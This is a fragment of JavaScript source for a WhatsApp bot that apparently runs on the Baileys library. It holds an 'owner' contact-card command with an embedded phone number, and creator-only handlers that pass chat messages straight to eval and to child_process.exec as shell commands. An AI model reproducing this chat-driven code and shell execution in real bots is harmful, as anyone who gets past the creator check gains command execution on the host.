case "owner":
case "xowner": {
  let namaown = `𝐑𝐢𝐳𝐱𝐕𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
  let NoOwn = `6289501955295`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓𝐡𝐞𝐄𝐱𝐭𝐨𝐫𝐝𝐢𝐭𝐜𝐯𝐙𝐚𝐩🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  client.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})